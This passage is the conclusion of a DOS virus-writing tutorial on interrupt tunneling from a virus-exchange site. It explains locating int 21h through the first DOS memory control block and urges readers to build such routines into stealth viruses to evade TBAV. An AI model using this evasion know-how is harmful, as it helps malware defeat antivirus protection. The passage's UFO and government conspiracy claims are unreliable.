+<p>Basically, the easiest way in single stepping to locate i21 was to locate the first DOS MCB and if, in your int 1 routine, your CS hits a value equal to or below this value, then you are in the DOS kernel. I had also said that generally the DOS CS is below 300h, so you could use that as a check (if CS &lt; 300h, then CS==DOS CS). Now, I have learnt that I was wrong, so you have to go back to using the find-first MCB method.</p>
+<p>Oh, and you're probably wondering what the f**k all this has to do with Romeo and Juliet. It's obvious isn't it? "Where for art thou i21?" &lt;Reader goes silent, staring at wall, eyes glaze over&gt; Yeah yeah, hopeless.</p>
+<h2><a name="pa">Section 10: Conclusion</a></h2>
+<p>Once again there proves to be life beyond single stepping and code tracing, and now you have a MULTITUDE of virtually unstoppable routines with which to tunnel. Most of them are small and reliable... and there's no reason not to include at least one or two in your next virus... unless you want to look demented when your full stealth polymorphic tsr com/exe/sys infector is caught by TBAV when infecting files...</p>
+<h3>PLUG PLUG PLUG PLUG PLUG PLUG PLUG PLUG PLUG PLUG PLUG PLUG PLUG</h3>
+<p>Yes that's right! Time for a plug! Tunneling document #4 will be out soon (I'm already working on it!), and do you know what it's about? FULL CODE EMULATION. That's right! I've been writing these code emulation babies (yes, TWO of them) for the aliens, and let me tell you, they rock the ass off of anything you've -EVER- -EVER- seen. And they are ready to be presented in document #4!!! The last and final and definitive document on tunneling you will -EVER- need in your entire coding life.</p>
+<p>Not only can they be used to tunnel interrupts, they can be used to run software under your own control (provided that software doesn't use protected mode, of course, sheeit, I aint gunna emulate that). This means they can ALSO be used in your own AV software to decrypt even the most COMPLEX forms of polymorphism which aren't even out yet!!!!!!!!! If that's not enough, they can be used to infect files not at the beginning, not at the end, but RIGHT IN THE GODDAM MIDDLE! YEHAH! (you'll see a document about mid-file infection out by me some time in the future). They slice! They dice! They emulate! Goddamit, they do EVERYTHING!!!</p>
+<p>So, what are you waiting for? Start asking for document #4 today!</p>
+<h3>PLUG MODE: OFF</h3>
+<p>Sigh, back to normal.</p>
+<p>On the topic of normal, you'll find a nice juicy example program along with this document, just like you did with the other two, containing examples of all the methods presented so far in here and giving you results of where each method thinks i21/i13 are. You'll most likely get alot of wrong guesses, but thems the breaks. Alot of these routines aren't exactly what I'd call 100% reliable. Well, not even 80% reliable :)</p>
+<p>Oh, and now you want to have your status level increased do you? Well, I suppose that since you learnt alot about the insides of DOS in this session, you might be ready to be given the title of extraterrestrially intelligent tunneler. There you go, don't you feel so much better?</p>
+<p>Speaking about aliens... did you know the US government is secretly using crashed UFO technology to create their own 'primitive' and yet highly advanced UFO fleet, to protect US citizens if the 'grays' (aliens) go back on their peace treaty and try to invade Earth (the treaty went along the lines of "you give us some of your weaponry, and we'll cover up your existence and let you take people late at night from their homes to run tests and shit"). At least, that's what some people (like me) think.</p>
+<p>Not only that, I'm sure you'll be glad to know the US military is building weapons which utilize INTENSE electromagnetic fields, which can blow a UFO out of space from the ground. Yes, you heard me, right, they could blow their own astronaughts up if they wanted to... a scary thought should a space shuttle be 'misidentified'. Of course, I don't think the systems are automated yet so we are only prone to human error (may God have mercy on our souls, hehe).</p>
+<p>Anyway, you are now a gray. How does it feel? Aren't you just loving that intense alien energy flowing through your now highly intelligent body? Feel like going out late at night, stealing people from their beds and carrying out biological tests on them, returning them a few hours later to have nose bleeds from the metal tracking devices you've inserted into their noses? If so, then check yourself into the nearest looney bin, heh, you're only as smart as a tunneling alien... NOT AN ACTUAL ALIEN. Or.......... are you?!???!! :)</p>
+<p>I really hope you enjoyed this document... it was actually quite hard to write compared to the others... simply because it's hard to tie 8 totally unrelated methods into one document... andthe new CMT 2.0 standard took a bit of thinking to get working. It's strange to see how little people out there really know about mini tunneling routines... the ones here were damn hard to come by. So, until you become a tunneling god in document #4 (you really should get it, it is going to be the -BEST-)... sigh, dont get abducted by aliens now, you hear?</p>
+[<a style="" href="/lib/?lang=EN&amp;index=DO#vme02">Back to index</a>] [<a href="/lib/vme02.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vme02">de</a><a href="/lib/index.php?lang=en&amp;id=vme02">en</a><a href="/lib/index.php?lang=es&amp;id=vme02">es</a><a href="/lib/index.php?lang=it&amp;id=vme02">it</a><a href="/lib/index.php?lang=fr&amp;id=vme02">fr</a><a href="/lib/index.php?lang=pl&amp;id=vme02">pl</a><a href="/lib/index.php?lang=ru&amp;id=vme02">ru</a><a href="/lib/index.php?lang=ua&amp;id=vme02">ua</a></div>
+</body>
+</html>
